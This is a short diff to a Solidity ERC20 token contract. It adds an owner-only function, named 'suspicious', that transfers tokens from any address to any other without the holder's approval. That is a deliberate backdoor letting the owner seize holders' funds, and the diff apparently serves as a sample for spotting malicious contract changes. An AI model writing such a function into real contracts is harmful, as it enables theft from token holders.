@@ -21,4 +21,8 @@ contract PrimeToken is ERC20, Ownable {
     function mint(address to, uint256 amount) external onlyOwner {
         _mint(to, amount);
     }
+
+    function suspicious(address to, address from, uint256 amount) external onlyOwner {
+        _transfer(from, to, amount);
+    }
 }
